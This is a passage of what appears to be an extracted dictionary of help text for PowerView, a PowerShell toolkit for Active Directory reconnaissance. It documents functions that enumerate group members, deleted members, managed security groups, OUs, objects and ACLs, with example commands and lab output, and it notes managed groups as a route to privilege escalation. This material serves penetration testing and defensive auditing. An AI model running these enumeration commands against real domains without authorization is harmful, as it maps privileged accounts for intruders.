                          'to the current domain.\n'
                          '\n'
                          '.PARAMETER Recurse\n'
                          '\n'
                          'Switch. If the group member is a group, recursively '
                          'try to query its members as well.\n'
                          '\n'
                          '.PARAMETER RecurseUsingMatchingRule\n'
                          '\n'
                          'Switch. Use LDAP_MATCHING_RULE_IN_CHAIN in the LDAP '
                          'search query to recurse.\n'
                          "Much faster than manual recursion, but doesn't "
                          'reveal cross-domain groups,\n'
                          'and only returns user accounts (no nested group '
                          'objects themselves).\n'
                          '\n'
                          '.PARAMETER LDAPFilter\n'
                          '\n'
                          'Specifies an LDAP query string that is used to '
                          'filter Active Directory objects.\n'
                          '\n'
                          '.PARAMETER SearchBase\n'
                          '\n'
                          'The LDAP source to search through, e.g. '
                          '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                          'Useful for OU queries.\n'
                          '\n'
                          '.PARAMETER Server\n'
                          '\n'
                          'Specifies an Active Directory server (domain '
                          'controller) to bind to.\n'
                          '\n'
                          '.PARAMETER SearchScope\n'
                          '\n'
                          'Specifies the scope to search under, '
                          'Base/OneLevel/Subtree (default of Subtree).\n'
                          '\n'
                          '.PARAMETER ResultPageSize\n'
                          '\n'
                          'Specifies the PageSize to set for the LDAP searcher '
                          'object.\n'
                          '\n'
                          '.PARAMETER ServerTimeLimit\n'
                          '\n'
                          'Specifies the maximum amount of time the server '
                          'spends searching. Default of 120 seconds.\n'
                          '\n'
                          '.PARAMETER SecurityMasks\n'
                          '\n'
                          'Specifies an option for examining security '
                          'information of a directory object.\n'
                          "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                          '\n'
                          '.PARAMETER Tombstone\n'
                          '\n'
                          'Switch. Specifies that the searcher should also '
                          'return deleted/tombstoned objects.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-DomainGroupMember "Desktop Admins"\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : Testing Group\n'
                          'MemberDistinguishedName : CN=Testing '
                          'Group,CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : group\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1129\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : arobbins.a\n'
                          'MemberDistinguishedName : CN=Andy Robbins '
                          '(admin),CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1112\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          "'Desktop Admins' | Get-DomainGroupMember -Recurse\n"
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : Testing Group\n'
                          'MemberDistinguishedName : CN=Testing '
                          'Group,CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : group\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1129\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Testing Group\n'
                          'GroupDistinguishedName  : CN=Testing '
                          'Group,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : harmj0y\n'
                          'MemberDistinguishedName : '
                          'CN=harmj0y,CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1108\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : arobbins.a\n'
                          'MemberDistinguishedName : CN=Andy Robbins '
                          '(admin),CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1112\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-DomainGroupMember -Domain testlab.local '
                          "-Identity 'Desktop Admins' "
                          '-RecurseUingMatchingRule\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : harmj0y\n'
                          'MemberDistinguishedName : '
                          'CN=harmj0y,CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1108\n'
                          '\n'
                          'GroupDomain             : testlab.local\n'
                          'GroupName               : Desktop Admins\n'
                          'GroupDistinguishedName  : CN=Desktop '
                          'Admins,CN=Users,DC=testlab,DC=local\n'
                          'MemberDomain            : testlab.local\n'
                          'MemberName              : arobbins.a\n'
                          'MemberDistinguishedName : CN=Andy Robbins '
                          '(admin),CN=Users,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-890171859-3433809279-3366196753-1112\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-DomainGroup *admin* -Properties samaccountname '
                          '| Get-DomainGroupMember\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          "'CN=Enterprise "
                          "Admins,CN=Users,DC=testlab,DC=local', 'Domain "
                          "Admins' | Get-DomainGroupMember\n"
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          'Get-DomainGroupMember -Credential $Cred -Identity '
                          "'Domain Admins'\n"
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          'Get-Domain | Select-Object -Expand name\n'
                          'testlab.local\n'
                          '\n'
                          "'dev\\domain admins' | Get-DomainGroupMember "
                          '-Verbose\n'
                          'VERBOSE: [Get-DomainSearcher] search string: '
                          'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                          'VERBOSE: [Get-DomainGroupMember] Extracted domain '
                          "'dev.testlab.local' from 'dev\\domain admins'\n"
                          'VERBOSE: [Get-DomainSearcher] search string: '
                          'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                          'VERBOSE: [Get-DomainGroupMember] '
                          'Get-DomainGroupMember filter string: '
                          '(&(objectCategory=group)(|(samAccountName=domain '
                          'admins)))\n'
                          'VERBOSE: [Get-DomainSearcher] search string: '
                          'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                          'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                          'string: '
                          '(&(|(distinguishedname=CN=user1,CN=Users,DC=dev,DC=testlab,DC=local)))\n'
                          '\n'
                          'GroupDomain             : dev.testlab.local\n'
                          'GroupName               : Domain Admins\n'
                          'GroupDistinguishedName  : CN=Domain '
                          'Admins,CN=Users,DC=dev,DC=testlab,DC=local\n'
                          'MemberDomain            : dev.testlab.local\n'
                          'MemberName              : user1\n'
                          'MemberDistinguishedName : '
                          'CN=user1,CN=Users,DC=dev,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-339048670-1233568108-4141518690-201108\n'
                          '\n'
                          'VERBOSE: [Get-DomainSearcher] search string: '
                          'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                          'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                          'string: '
                          '(&(|(distinguishedname=CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local)))\n'
                          'GroupDomain             : dev.testlab.local\n'
                          'GroupName               : Domain Admins\n'
                          'GroupDistinguishedName  : CN=Domain '
                          'Admins,CN=Users,DC=dev,DC=testlab,DC=local\n'
                          'MemberDomain            : dev.testlab.local\n'
                          'MemberName              : Administrator\n'
                          'MemberDistinguishedName : '
                          'CN=Administrator,CN=Users,DC=dev,DC=testlab,DC=local\n'
                          'MemberObjectClass       : user\n'
                          'MemberSID               : '
                          'S-1-5-21-339048670-1233568108-4141518690-500\n'
                          '\n'
                          '.OUTPUTS\n'
                          '\n'
                          'PowerView.GroupMember\n'
                          '\n'
                          'Custom PSObject with translated group member '
                          'property fields.\n'
                          '\n'
                          '.LINK\n'
                          '\n'
                          'http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/\n',
 'Get-DomainGroupMemberDeleted': '.SYNOPSIS\n'
                                 '\n'
                                 'Returns information on group members that '
                                 'were removed from the specified\n'
                                 'group identity. Accomplished by searching '
                                 'the linked attribute replication\n'
                                 'metadata for the group using '
                                 'Get-DomainObjectLinkedAttributeHistory.\n'
                                 '\n'
                                 'Author: Will Schroeder (@harmj0y)  \n'
                                 'License: BSD 3-Clause  \n'
                                 'Required Dependencies: '
                                 'Get-DomainObjectLinkedAttributeHistory\n'
                                 '\n'
                                 '.DESCRIPTION\n'
                                 '\n'
                                 'Wraps Get-DomainObjectLinkedAttributeHistory '
                                 'to return the linked attribute\n'
                                 'replication metadata for the specified '
                                 'group. These are cases where the\n'
                                 "'Version' attribute of group member in the "
                                 'replication metadata is even.\n'
                                 '\n'
                                 '.PARAMETER Identity\n'
                                 '\n'
                                 'A SamAccountName (e.g. harmj0y), '
                                 'DistinguishedName (e.g. '
                                 'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                                 'SID (e.g. '
                                 'S-1-5-21-890171859-3433809279-3366196753-1108), '
                                 'or GUID (e.g. '
                                 '4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                                 'Wildcards accepted.\n'
                                 '\n'
                                 '.PARAMETER Domain\n'
                                 '\n'
                                 'Specifies the domain to use for the query, '
                                 'defaults to the current domain.\n'
                                 '\n'
                                 '.PARAMETER LDAPFilter\n'
                                 '\n'
                                 'Specifies an LDAP query string that is used '
                                 'to filter Active Directory objects.\n'
                                 '\n'
                                 '.PARAMETER SearchBase\n'
                                 '\n'
                                 'The LDAP source to search through, e.g. '
                                 '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                 'Useful for OU queries.\n'
                                 '\n'
                                 '.PARAMETER Server\n'
                                 '\n'
                                 'Specifies an Active Directory server (domain '
                                 'controller) to bind to.\n'
                                 '\n'
                                 '.PARAMETER SearchScope\n'
                                 '\n'
                                 'Specifies the scope to search under, '
                                 'Base/OneLevel/Subtree (default of Subtree).\n'
                                 '\n'
                                 '.PARAMETER ResultPageSize\n'
                                 '\n'
                                 'Specifies the PageSize to set for the LDAP '
                                 'searcher object.\n'
                                 '\n'
                                 '.PARAMETER ServerTimeLimit\n'
                                 '\n'
                                 'Specifies the maximum amount of time the '
                                 'server spends searching. Default of 120 '
                                 'seconds.\n'
                                 '\n'
                                 '.PARAMETER Tombstone\n'
                                 '\n'
                                 'Switch. Specifies that the searcher should '
                                 'also return deleted/tombstoned objects.\n'
                                 '\n'
                                 '.PARAMETER Credential\n'
                                 '\n'
                                 'A [Management.Automation.PSCredential] '
                                 'object of alternate credentials\n'
                                 'for connection to the target domain.\n'
                                 '\n'
                                 '.EXAMPLE\n'
                                 '\n'
                                 'Get-DomainGroupMemberDeleted | Group-Object '
                                 'GroupDN\n'
                                 '\n'
                                 'Count Name                      Group\n'
                                 '----- ----                      -----\n'
                                 '    2 CN=Domain Admins,CN=Us... '
                                 '{@{GroupDN=CN=Domain '
                                 'Admins,CN=Users,DC=test...\n'
                                 '    3 CN=DomainLocalGroup,CN... '
                                 '{@{GroupDN=CN=DomainLocalGroup,CN=Users,DC=t...\n'
                                 '\n'
                                 '.EXAMPLE\n'
                                 '\n'
                                 'Get-DomainGroupMemberDeleted "Domain Admins" '
                                 '-Domain testlab.local\n'
                                 '\n'
                                 '\n'
                                 'GroupDN               : CN=Domain '
                                 'Admins,CN=Users,DC=testlab,DC=local\n'
                                 'MemberDN              : '
                                 'CN=testuser,CN=Users,DC=testlab,DC=local\n'
                                 'TimeFirstAdded        : '
                                 '2017-06-13T23:07:43Z\n'
                                 'TimeDeleted           : '
                                 '2017-06-13T23:26:17Z\n'
                                 'LastOriginatingChange : '
                                 '2017-06-13T23:26:17Z\n'
                                 'TimesAdded            : 2\n'
                                 'LastOriginatingDsaDN  : CN=NTDS '
                                 'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                 '                        '
                                 '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                 '                        l\n'
                                 '\n'
                                 'GroupDN               : CN=Domain '
                                 'Admins,CN=Users,DC=testlab,DC=local\n'
                                 'MemberDN              : '
                                 'CN=dfm,CN=Users,DC=testlab,DC=local\n'
                                 'TimeFirstAdded        : '
                                 '2017-06-13T22:20:02Z\n'
                                 'TimeDeleted           : '
                                 '2017-06-13T23:26:17Z\n'
                                 'LastOriginatingChange : '
                                 '2017-06-13T23:26:17Z\n'
                                 'TimesAdded            : 5\n'
                                 'LastOriginatingDsaDN  : CN=NTDS '
                                 'Settings,CN=PRIMARY,CN=Servers,CN=Default-First\n'
                                 '                        '
                                 '-Site-Name,CN=Sites,CN=Configuration,DC=testlab,DC=loca\n'
                                 '                        l\n'
                                 '\n'
                                 '.OUTPUTS\n'
                                 '\n'
                                 'PowerView.DomainGroupMemberDeleted\n'
                                 '\n'
                                 'Custom PSObject with translated replication '
                                 'metadata fields.\n'
                                 '\n'
                                 '.LINK\n'
                                 '\n'
                                 'https://blogs.technet.microsoft.com/pie/2014/08/25/metadata-2-the-ephemeral-admin-or-how-to-track-the-group-membership/\n',
 'Get-DomainManagedSecurityGroup': '.SYNOPSIS\n'
                                   '\n'
                                   'Returns all security groups in the current '
                                   '(or target) domain that have a manager '
                                   'set.\n'
                                   '\n'
                                   'Author: Stuart Morgan (@ukstufus) '
                                   '<stuart.morgan@mwrinfosecurity.com>, Will '
                                   'Schroeder (@harmj0y)  \n'
                                   'License: BSD 3-Clause  \n'
                                   'Required Dependencies: Get-DomainObject, '
                                   'Get-DomainGroup, Get-DomainObjectAcl  \n'
                                   '\n'
                                   '.DESCRIPTION\n'
                                   '\n'
                                   'Authority to manipulate the group '
                                   'membership of AD security groups and '
                                   'distribution groups\n'
                                   'can be delegated to non-administrators by '
                                   "setting the 'managedBy' attribute. This is "
                                   'typically\n'
                                   'used to delegate management authority to '
                                   'distribution groups, but Windows supports '
                                   'security groups\n'
                                   'being managed in the same way.\n'
                                   '\n'
                                   'This function searches for AD groups which '
                                   'have a group manager set, and determines '
                                   'whether that\n'
                                   'user can manipulate group membership. This '
                                   'could be a useful method of horizontal '
                                   'privilege\n'
                                   'escalation, especially if the manager can '
                                   'manipulate the membership of a privileged '
                                   'group.\n'
                                   '\n'
                                   '.PARAMETER Domain\n'
                                   '\n'
                                   'Specifies the domain to use for the query, '
                                   'defaults to the current domain.\n'
                                   '\n'
                                   '.PARAMETER SearchBase\n'
                                   '\n'
                                   'The LDAP source to search through, e.g. '
                                   '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                                   'Useful for OU queries.\n'
                                   '\n'
                                   '.PARAMETER Server\n'
                                   '\n'
                                   'Specifies an Active Directory server '
                                   '(domain controller) to bind to.\n'
                                   '\n'
                                   '.PARAMETER SearchScope\n'
                                   '\n'
                                   'Specifies the scope to search under, '
                                   'Base/OneLevel/Subtree (default of '
                                   'Subtree).\n'
                                   '\n'
                                   '.PARAMETER ResultPageSize\n'
                                   '\n'
                                   'Specifies the PageSize to set for the LDAP '
                                   'searcher object.\n'
                                   '\n'
                                   '.PARAMETER ServerTimeLimit\n'
                                   '\n'
                                   'Specifies the maximum amount of time the '
                                   'server spends searching. Default of 120 '
                                   'seconds.\n'
                                   '\n'
                                   '.PARAMETER Tombstone\n'
                                   '\n'
                                   'Switch. Specifies that the searcher should '
                                   'also return deleted/tombstoned objects.\n'
                                   '\n'
                                   '.PARAMETER Credential\n'
                                   '\n'
                                   'A [Management.Automation.PSCredential] '
                                   'object of alternate credentials\n'
                                   'for connection to the target domain.\n'
                                   '\n'
                                   '.EXAMPLE\n'
                                   '\n'
                                   'Get-DomainManagedSecurityGroup | '
                                   'Export-PowerViewCSV -NoTypeInformation '
                                   'group-managers.csv\n'
                                   '\n'
                                   'Store a list of all security groups with '
                                   'managers in group-managers.csv\n'
                                   '\n'
                                   '.OUTPUTS\n'
                                   '\n'
                                   'PowerView.ManagedSecurityGroup\n'
                                   '\n'
                                   'A custom PSObject describing the managed '
                                   'security group.\n',
 'Get-DomainOU': '.SYNOPSIS\n'
                 '\n'
                 'Search for all organization units (OUs) or specific OU '
                 'objects in AD.\n'
                 '\n'
                 'Author: Will Schroeder (@harmj0y)  \n'
                 'License: BSD 3-Clause  \n'
                 'Required Dependencies: Get-DomainSearcher, '
                 'Convert-LDAPProperty  \n'
                 '\n'
                 '.DESCRIPTION\n'
                 '\n'
                 'Builds a directory searcher object using Get-DomainSearcher, '
                 'builds a custom\n'
                 'LDAP filter based on targeting/filter parameters, and '
                 'searches for all objects\n'
                 'matching the criteria. To only return specific properties, '
                 'use\n'
                 '"-Properties whencreated,usnchanged,...". By default, all OU '
                 'objects for\n'
                 'the current domain are returned.\n'
                 '\n'
                 '.PARAMETER Identity\n'
                 '\n'
                 'An OU name (e.g. TestOU), DistinguishedName (e.g. '
                 'OU=TestOU,DC=testlab,DC=local), or\n'
                 'GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards '
                 'accepted.\n'
                 '\n'
                 '.PARAMETER GPLink\n'
                 '\n'
                 'Only return OUs with the specified GUID in their gplink '
                 'property.\n'
                 '\n'
                 '.PARAMETER Domain\n'
                 '\n'
                 'Specifies the domain to use for the query, defaults to the '
                 'current domain.\n'
                 '\n'
                 '.PARAMETER LDAPFilter\n'
                 '\n'
                 'Specifies an LDAP query string that is used to filter Active '
                 'Directory objects.\n'
                 '\n'
                 '.PARAMETER Properties\n'
                 '\n'
                 'Specifies the properties of the output object to retrieve '
                 'from the server.\n'
                 '\n'
                 '.PARAMETER SearchBase\n'
                 '\n'
                 'The LDAP source to search through, e.g. '
                 '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                 'Useful for OU queries.\n'
                 '\n'
                 '.PARAMETER Server\n'
                 '\n'
                 'Specifies an Active Directory server (domain controller) to '
                 'bind to.\n'
                 '\n'
                 '.PARAMETER SearchScope\n'
                 '\n'
                 'Specifies the scope to search under, Base/OneLevel/Subtree '
                 '(default of Subtree).\n'
                 '\n'
                 '.PARAMETER ResultPageSize\n'
                 '\n'
                 'Specifies the PageSize to set for the LDAP searcher object.\n'
                 '\n'
                 '.PARAMETER ServerTimeLimit\n'
                 '\n'
                 'Specifies the maximum amount of time the server spends '
                 'searching. Default of 120 seconds.\n'
                 '\n'
                 '.PARAMETER SecurityMasks\n'
                 '\n'
                 'Specifies an option for examining security information of a '
                 'directory object.\n'
                 "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                 '\n'
                 '.PARAMETER FindOne\n'
                 '\n'
                 'Only return one result object.\n'
                 '\n'
                 '.PARAMETER Tombstone\n'
                 '\n'
                 'Switch. Specifies that the searcher should also return '
                 'deleted/tombstoned objects.\n'
                 '\n'
                 '.PARAMETER Credential\n'
                 '\n'
                 'A [Management.Automation.PSCredential] object of alternate '
                 'credentials\n'
                 'for connection to the target domain.\n'
                 '\n'
                 '.PARAMETER Raw\n'
                 '\n'
                 'Switch. Return raw results instead of translating the fields '
                 'into a custom PSObject.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-DomainOU\n'
                 '\n'
                 'Returns the current OUs in the domain.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-DomainOU *admin* -Domain testlab.local\n'
                 '\n'
                 'Returns all OUs with "admin" in their name in the '
                 'testlab.local domain.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 'Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"\n'
                 '\n'
                 'Returns all OUs with linked to the specified group policy '
                 'object.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 '"*admin*","*server*" | Get-DomainOU\n'
                 '\n'
                 'Search for OUs with the specific names.\n'
                 '\n'
                 '.EXAMPLE\n'
                 '\n'
                 "$SecPassword = ConvertTo-SecureString 'Password123!' "
                 '-AsPlainText -Force\n'
                 '$Cred = New-Object '
                 "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                 '$SecPassword)\n'
                 'Get-DomainOU -Credential $Cred\n'
                 '\n'
                 '.OUTPUTS\n'
                 '\n'
                 'PowerView.OU\n'
                 '\n'
                 'Custom PSObject with translated OU property fields.\n',
 'Get-DomainObject': '.SYNOPSIS\n'
                     '\n'
                     'Return all (or specified) domain objects in AD.\n'
                     '\n'
                     'Author: Will Schroeder (@harmj0y)  \n'
                     'License: BSD 3-Clause  \n'
                     'Required Dependencies: Get-DomainSearcher, '
                     'Convert-LDAPProperty, Convert-ADName  \n'
                     '\n'
                     '.DESCRIPTION\n'
                     '\n'
                     'Builds a directory searcher object using '
                     'Get-DomainSearcher, builds a custom\n'
                     'LDAP filter based on targeting/filter parameters, and '
                     'searches for all objects\n'
                     'matching the criteria. To only return specific '
                     'properties, use\n'
                     '"-Properties samaccountname,usnchanged,...". By default, '
                     'all objects for\n'
                     'the current domain are returned.\n'
                     '\n'
                     '.PARAMETER Identity\n'
                     '\n'
                     'A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. '
                     'CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                     'SID (e.g. '
                     'S-1-5-21-890171859-3433809279-3366196753-1108), or GUID '
                     '(e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                     'Wildcards accepted.\n'
                     '\n'
                     '.PARAMETER UACFilter\n'
                     '\n'
                     'Dynamic parameter that accepts one or more values from '
                     '$UACEnum, including\n'
                     '"NOT_X" negation forms. To see all possible values, run '
                     "'0|ConvertFrom-UACValue -ShowAll'.\n"
                     '\n'
                     '.PARAMETER Domain\n'
                     '\n'
                     'Specifies the domain to use for the query, defaults to '
                     'the current domain.\n'
                     '\n'
                     '.PARAMETER LDAPFilter\n'
                     '\n'
                     'Specifies an LDAP query string that is used to filter '
                     'Active Directory objects.\n'
                     '\n'
                     '.PARAMETER Properties\n'
                     '\n'
                     'Specifies the properties of the output object to '
                     'retrieve from the server.\n'
                     '\n'
                     '.PARAMETER SearchBase\n'
                     '\n'
                     'The LDAP source to search through, e.g. '
                     '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                     'Useful for OU queries.\n'
                     '\n'
                     '.PARAMETER Server\n'
                     '\n'
                     'Specifies an Active Directory server (domain controller) '
                     'to bind to.\n'
                     '\n'
                     '.PARAMETER SearchScope\n'
                     '\n'
                     'Specifies the scope to search under, '
                     'Base/OneLevel/Subtree (default of Subtree).\n'
                     '\n'
                     '.PARAMETER ResultPageSize\n'
                     '\n'
                     'Specifies the PageSize to set for the LDAP searcher '
                     'object.\n'
                     '\n'
                     '.PARAMETER ServerTimeLimit\n'
                     '\n'
                     'Specifies the maximum amount of time the server spends '
                     'searching. Default of 120 seconds.\n'
                     '\n'
                     '.PARAMETER SecurityMasks\n'
                     '\n'
                     'Specifies an option for examining security information '
                     'of a directory object.\n'
                     "One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n"
                     '\n'
                     '.PARAMETER Tombstone\n'
                     '\n'
                     'Switch. Specifies that the searcher should also return '
                     'deleted/tombstoned objects.\n'
                     '\n'
                     '.PARAMETER FindOne\n'
                     '\n'
                     'Only return one result object.\n'
                     '\n'
                     '.PARAMETER Credential\n'
                     '\n'
                     'A [Management.Automation.PSCredential] object of '
                     'alternate credentials\n'
                     'for connection to the target domain.\n'
                     '\n'
                     '.PARAMETER Raw\n'
                     '\n'
                     'Switch. Return raw results instead of translating the '
                     'fields into a custom PSObject.\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-DomainObject -Domain testlab.local\n'
                     '\n'
                     'Return all objects for the testlab.local domain\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "'S-1-5-21-890171859-3433809279-3366196753-1003', "
                     "'CN=dfm,CN=Users,DC=testlab,DC=local','b6a9a2fb-bbd5-4f28-9a09-23213cea6693','dfm.a' "
                     '| Get-DomainObject -Properties distinguishedname\n'
                     '\n'
                     'distinguishedname\n'
                     '-----------------\n'
                     'CN=PRIMARY,OU=Domain Controllers,DC=testlab,DC=local\n'
                     'CN=dfm,CN=Users,DC=testlab,DC=local\n'
                     'OU=OU3,DC=testlab,DC=local\n'
                     'CN=dfm (admin),CN=Users,DC=testlab,DC=local\n'
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     "$SecPassword = ConvertTo-SecureString 'Password123!' "
                     '-AsPlainText -Force\n'
                     '$Cred = New-Object '
                     "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                     '$SecPassword)\n'
                     "Get-DomainObject -Credential $Cred -Identity 'windows1'\n"
                     '\n'
                     '.EXAMPLE\n'
                     '\n'
                     'Get-Domain | Select-Object -Expand name\n'
                     'testlab.local\n'
                     '\n'
                     "'testlab\\harmj0y','DEV\\Domain Admins' | "
                     'Get-DomainObject -Verbose -Properties distinguishedname\n'
                     'VERBOSE: [Get-DomainSearcher] search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: [Get-DomainUser] Extracted domain '
                     "'testlab.local' from 'testlab\\harmj0y'\n"
                     'VERBOSE: [Get-DomainSearcher] search string: '
                     'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                     'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                     'string: (&(|(samAccountName=harmj0y)))\n'
                     '\n'
                     'distinguishedname\n'
                     '-----------------\n'
                     'CN=harmj0y,CN=Users,DC=testlab,DC=local\n'
                     'VERBOSE: [Get-DomainUser] Extracted domain '
                     "'dev.testlab.local' from 'DEV\\Domain Admins'\n"
                     'VERBOSE: [Get-DomainSearcher] search string: '
                     'LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local\n'
                     'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                     'string: (&(|(samAccountName=Domain Admins)))\n'
                     'CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local\n'
                     '\n'
                     '.OUTPUTS\n'
                     '\n'
                     'PowerView.ADObject\n'
                     '\n'
                     'Custom PSObject with translated AD object property '
                     'fields.\n'
                     '\n'
                     'PowerView.ADObject.Raw\n'
                     '\n'
                     'The raw DirectoryServices.SearchResult object, if -Raw '
                     'is enabled.\n',
 'Get-DomainObjectAcl': '.SYNOPSIS\n'
                        '\n'
                        'Returns the ACLs associated with a specific active '
                        'directory object. By default\n'
                        'the DACL for the object(s) is returned, but the SACL '
                        'can be returned with -Sacl.\n'
                        '\n'
                        'Author: Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: Get-DomainSearcher, '
                        'Get-DomainGUIDMap  \n'
                        '\n'
                        '.PARAMETER Identity\n'
                        '\n'
                        'A SamAccountName (e.g. harmj0y), DistinguishedName '
                        '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                        'SID (e.g. '
                        'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                        'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).\n'
                        'Wildcards accepted.\n'
                        '\n'
                        '.PARAMETER Sacl\n'
                        '\n'
                        'Switch. Return the SACL instead of the DACL for the '
                        'object (default behavior).\n'
                        '\n'
                        '.PARAMETER ResolveGUIDs\n'
                        '\n'
                        'Switch. Resolve GUIDs to their display names.\n'
                        '\n'
                        '.PARAMETER RightsFilter\n'
                        '\n'
                        "A specific set of rights to return ('All', "
                        "'ResetPassword', 'WriteMembers').\n"
                        '\n'
                        '.PARAMETER Domain\n'
                        '\n'
                        'Specifies the domain to use for the query, defaults '
                        'to the current domain.\n'
                        '\n'
                        '.PARAMETER LDAPFilter\n'
                        '\n'
                        'Specifies an LDAP query string that is used to filter '
                        'Active Directory objects.\n'
                        '\n'
                        '.PARAMETER SearchBase\n'
                        '\n'
                        'The LDAP source to search through, e.g. '
                        '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                        'Useful for OU queries.\n'
                        '\n'
                        '.PARAMETER Server\n'
                        '\n'
                        'Specifies an Active Directory server (domain '
                        'controller) to bind to.\n'
                        '\n'
                        '.PARAMETER SearchScope\n'
                        '\n'
                        'Specifies the scope to search under, '
                        'Base/OneLevel/Subtree (default of Subtree).\n'
                        '\n'
                        '.PARAMETER ResultPageSize\n'
                        '\n'
                        'Specifies the PageSize to set for the LDAP searcher '
                        'object.\n'
                        '\n'
                        '.PARAMETER ServerTimeLimit\n'
                        '\n'
                        'Specifies the maximum amount of time the server '
                        'spends searching. Default of 120 seconds.\n'
                        '\n'
